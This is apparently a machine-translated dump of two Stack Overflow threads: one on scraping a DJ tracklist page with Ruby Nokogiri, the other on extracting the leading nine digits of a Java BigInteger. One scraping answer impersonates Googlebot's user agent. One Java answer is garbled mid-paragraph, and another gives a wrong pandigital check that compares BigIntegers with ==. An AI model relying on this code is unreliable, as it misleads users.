<span class="tracklistTrack floatL"id="tr_103905" ><a href="/track/103905_above-beyond-black-room-boy-above-beyond-club-mix/index.html" class="">Above &amp; Beyond - Black Room Boy (Above &amp; Beyond Club Mix)</a>&thinsp;</span><span class="floatL">[<a href="/label/1037_anjunabeats/index.html" title="Anjunabeats">ANJUNABEATS</a>]</span>  
<div id="tlp5_actions" class="floatL" style="margin-top:1px;"> 
```

有一个带有“tlp_433662”值的 CSS 选择器。页面上的每首歌曲都有自己的唯一 ID。一个将有“tlp_433662”，下一个将有“tlp_433628”或类似的东西。

有没有办法使用 Nokogiri 和 XPath 提取曲目列表页面上列出的所有歌曲？我可能想在下面列出的“数据”上“做”一个“每个”，以便**刮板**循环提取每组相关数据的数据。这是我的 Ruby 程序的开始：

```
require 'rubygems'
require 'nokogiri'
require 'open-uri'

url = "http://www.1001tracklists.com/tracklist/25122_lange-intercity-podcast-115-2013-03-06.html"
data = Nokogiri::HTML(open(url))
# what do do next? print out xpath loop code which extracts my data.
# code block I need help with
data.xpath.........each do |block|
block.xpath("...........").each do |span|
    puts stuff printing out what I want.
end
end 
```

我知道该怎么做的最终目标是将这个 Ruby 脚本带到 Sinatra 以“网络化”数据并添加一些不错的 Twitter 引导 CSS，如以下 youtube 视频所示：[http ://www.youtube.com/watch ?v=PWI1PIvy4A8](http://www.youtube.com/watch?v=PWI1PIvy4A8)

你能帮我处理 XPath 代码块，以便我可以抓取数据并打印数组吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T05:01:16.783

```
require 'nokogiri'
require 'rest-client'

url = 'http://www.1001tracklists.com/tracklist/25122_lange-intercity-podcast-115-2013-03-06.html'
page = Nokogiri::HTML(RestClient.get(url,:user_agent=>'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'), nil, 'UTF-8');

page.css('table.detail tr.tlpItem').each do |row|
  artist = row.css('meta[@itemprop="byArtist"]').attr('content')
  name = row.css('meta[@itemprop="name"]').attr('content')

  puts "#{artist} - #{name}"
end 
```

...一个更高级的版本，它从行中获取所有元信息并打印“艺术家 - 歌曲 [Publisher]

```
require 'nokogiri'
require 'rest-client'

url = 'http://www.1001tracklists.com/tracklist/25122_lange-intercity-podcast-115-2013-03-06.html'
page = Nokogiri::HTML(RestClient.get(url,:user_agent=>'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'), nil, 'UTF-8');

page.css('table.detail tr.tlpItem').each do |row|

  meta  = row.search('meta').each_with_object({}) do |tag, hash|
    hash[tag['itemprop']] = tag['content']
  end

  puts "#{meta['byArtist']} - #{meta['name']} [#{meta['publisher']||'Unknown'}]"
end 
```

您将获得其余属性的图片。你需要做一些错误/存在吗？检查，因为有些歌曲没有所有的属性。但这应该让你走上正轨。我也使用了`rest-client`gem，所以你可以随意使用任何你想要检索页面的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T05:02:13.980

这是一些将信息收集到哈希数组中的代码。

我更喜欢使用 CSS 访问器而不是 XPath，因为如果您有任何 HTML/CSS 或 jQuery 经验，它们的可读性更高。

```
require 'nokogiri'
require 'open-uri'

doc = Nokogiri::HTML(open('http://www.1001tracklists.com/tracklist/25122_lange-intercity-podcast-115-2013-03-06.html'))
data = doc.search('tr.tlpItem div[itemtype="http://schema.org/MusicRecording"]').each_with_object([]) do |div, array|
  hash = div.search('meta').each_with_object({}) do |m, h|
    h[m['itemprop']] = m['content']
  end

  link = div.at('span a')
  hash['tracklistTrack'] = [ link['href'], link.text ]

  title = div.at('span.floatL a')
  hash['title'] = [title['href'], title.text ]

  array << hash
end

pp data[0, 2] 
```

它输出页面数据的子集。经过一番按摩后，结构如下所示：

```
[
  {
    "byArtist"=>"Markus Schulz",
    "name"=>"The Spiritual Gateway (Transmission 2013 Theme)",
    "publisher"=>"COLDHARBOUR RECORDINGS",
    "url"=>"/track/108928_markus-schulz-the-spiritual-gateway-transmission-2013-theme/index.html",
    "tracklistTrack"=>[
        "/track/108928_markus-schulz-the-spiritual-gateway-transmission-2013-theme/index.html",
        "Markus Schulz - The Spiritual Gateway (Transmission 2013 Theme)"
      ],
    "title"=>[
      "/track/108928_markus-schulz-the-spiritual-gateway-transmission-2013-theme/index.html",
      "Markus Schulz - The Spiritual Gateway (Transmission 2013 Theme)"
    ]
  },
  {
    "byArtist"=>"Lange & Audrey Gallagher",
    "name"=>"Our Way Home (Noah Neiman Remix)",
    "publisher"=>"LANGE RECORDINGS",
    "url"=>"/track/119667_lange-audrey-gallagher-our-way-home-noah-neiman-remix/index.html",
    "tracklistTrack"=>[
      "/track/119667_lange-audrey-gallagher-our-way-home-noah-neiman-remix/index.html",
      "Lange & Audrey Gallagher - Our Way Home (Noah Neiman Remix)"
    ],
    "title"=>[
      "/track/119667_lange-audrey-gallagher-our-way-home-noah-neiman-remix/index.html",
      "Lange & Audrey Gallagher - Our Way Home (Noah Neiman Remix)"
    ]
  }
] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-04T16:44:53.277

有这个免费的网络服务，它从给定的 url 中抓取所有 400 多个**schema.org**类，并将它们作为 JSON 返回

[http://scrappy.netfluid.org/](http://scrappy.netfluid.org/)

# java - 切割前 9 位数字

> ID：15262999
> 
> 赞同：1
> 
> 时间：2013-03-07T04:19:08.073
> 
> 标签：java, algorithm, math, fibonacci

好吧，我正在尝试解决我的一个朋友让我做的一个挑战，好吧，我已经设法从一口井中剪掉最后 9 个数字，`BigInteger`我有办法剪掉前 9 个数字，但它太慢了，它花了太长时间。

我需要前 9 和后 9 的原因是因为我正在寻找`BigInteger`第一个和最后一个是泛数字的。

**如果您不**明白我的意思是说我们`n = new BigInteger("123456789987654321")`很好，我需要分别获取“123456789”和“987654321”，并且我不想将 BigInteger 转换为字符串，因为这是一个非常缓慢的过程。

 **我在这里追求速度，我只是对这个解决方案感到困惑。我听说过一些关于使用黄金分割率的事情？如果您有兴趣，这是我的代码。

```
import java.math.BigInteger;

public class Main {

    public static void main(String...strings)
    {       
        long timeStart = System.currentTimeMillis();
        fib(350_000);
        long timeEnd = System.currentTimeMillis();
        System.out.println("Finished processing, time: " + (timeEnd - timeStart) + " milliseconds.");
    }

    public static BigInteger fib(int n)
    {
        BigInteger prev1 = BigInteger.valueOf(0), prev2 = BigInteger.valueOf(1);        
        for (int i = 0; i < n; i++)
        {   

            // TODO: Check if the head is pandigital as well.
            BigInteger tailing9Digits = tailing9Digits(prev1);
            boolean tailPandigital = isPanDigital(tailing9Digits);

            if (tailPandigital)
            {                   
                System.out.println("Solved at index: " + i);
                break;
            }
            BigInteger savePrev1 = prev1;
            prev1 = prev2;
            prev2 = savePrev1.add(prev2);
        }
        return prev1;
    }

    public static BigInteger leading9Digits(BigInteger x)
    {
        // STUCK HERE.
        return null;
    }

    public static BigInteger tailing9Digits(BigInteger x) 
    {
        return x.remainder(BigInteger.TEN.pow(9));
    }

    static BigInteger[] pows = new BigInteger[16];

    static 
    {
        for (int i = 0; i < 16; i++) 
        {
            pows[i] = BigInteger.TEN.pow(i);
        }
    }

    static boolean isPanDigital(BigInteger n) 
    {
        if (!n.remainder(BigInteger.valueOf(9)).equals(BigInteger.ZERO)) 
        {
            return false;
        }
        boolean[] foundDigits = new boolean[9];

        boolean isPanDigital = true;
        for (int i = 1; i <= 9; i++) 
        {
            BigInteger digit = n.remainder(pows[i]).divide(pows[i - 1]);
            for (int j = 0; j < foundDigits.length; j++) {
                if (digit.equals(BigInteger.valueOf(j + 1)) && !foundDigits[j])
                {
                    foundDigits[j] = true;
                }
            }
        }

        for (int i = 0; i < 9; i++)
        {
            isPanDigital = isPanDigital && foundDigits[i];
        }

        return isPanDigital;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:48:10.700

`BigInteger`如果您完全关心速度，我不建议您使用它。它的大多数方法都实现得很差，这通常会导致代码非常慢。

除法和基数转换有一个分而治之的技巧，您可能会发现它很有帮助。

首先，`BigInteger`是`multiply()`二次的。你需要解决这个问题，否则这些分而治之的技巧不会导致任何加速。通过快速傅立叶变换进行的乘法相当快而且很好。

如果要将 a 转换为`BigInteger`以 10 为底，请将其分成两半（按位）并将其写为`a * 256^k + b.` 您可以做的一件事是递归地转换`a`和以 10 为底，然后通过重复平方转换为十进制，然后以 10 为底，乘以并添加到结果。此外，由于您只对前几位数字感兴趣，因此如果添加小到.`b``256^k``a``256^k``b``b``a * 256^k``b`

类似的技巧适用于除法。

`toByteArray()`您可以使用该方法进行位移和提取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:19:04.473

好吧，我相信这就是您所需要的：

```
import java.math.BigInteger;

public class PandigitalCheck {

    public static void main(String[] args) {

        BigInteger num = new BigInteger("12345678907438297438924239987654321");
        long timeStart = System.currentTimeMillis();
        System.out.println("Is Pandigital: " + isPandigital(num));
        long timeEnd = System.currentTimeMillis();
        System.out.println("Time Taken: " + (timeEnd - timeStart) + " ms");
    }

    private static boolean isPandigital(BigInteger num) {
        if (getTrailing9Digits(num).compareTo(getLeading9Digits(num)) == 0) {
            return true;
        }

        return false;
    }

    private static BigInteger getLeading9Digits(BigInteger num) {
        int length = getBigIntLength(num);
        BigInteger leading9 = BigInteger.ZERO;
        for (int i = 0; i < 9; i++) {
            BigInteger remainder = num.divide(BigInteger.TEN.pow(length - 1 - i));
            leading9 = leading9.add(remainder.multiply(BigInteger.TEN.pow(i)));
            num = num.remainder(BigInteger.TEN.pow(length - 1 - i));
        }

        return leading9;
    }

    private static int getBigIntLength(BigInteger num) {
        for (int i = 1; ; i++) {
            if (num.divide(BigInteger.TEN.pow(i)) == BigInteger.ZERO) {
                return i;
            }
        }
    }

    private static BigInteger getTrailing9Digits(BigInteger num) {
        return num.remainder(BigInteger.TEN.pow(9));
    }

} 
```

输出是：

```
Is Pandigital: true
Time Taken: 0 ms 
```

它符合要求吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T05:23:59.013

我是 java 的新手，我只将 BigInteger 转换为 String，但它与您的代码一样快

```
import java.math.BigInteger;
public class Main {
    public static void main(String args[])
    {       
        long timeStart = System.currentTimeMillis();
        String biStr = new BigInteger("123456789987654321").toString();
        int length=(biStr.length())/2;
        String[] ints = new String[length];
        String[] ints2 = new String[length];
        for(int i=0; i<length; i++) {
            int j=i+length;
            ints[i] = String.valueOf(biStr.charAt(i));
            ints2[i] = String.valueOf(biStr.charAt(j));
            System.out.println(ints[i] +"  |  "+ints2[i]);
        }
        long timeEnd = System.currentTimeMillis();
        System.out.println("Finished processing, time: " + (timeEnd - timeStart) + " milliseconds.");
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T05:08:13.647

也许这不是太快，但至少它很简单

```
 BigInteger n = new BigInteger("123456789987654321");
    BigInteger n2 = n.divide(BigInteger.TEN.pow(new BigDecimal(n).precision() - 9));
    BigInteger n1 = n.remainder(new BigInteger("1000000000"));
    System.out.println(n1);
    System.out.println(n2); 
```

输出

```
987654321
123456789 
```**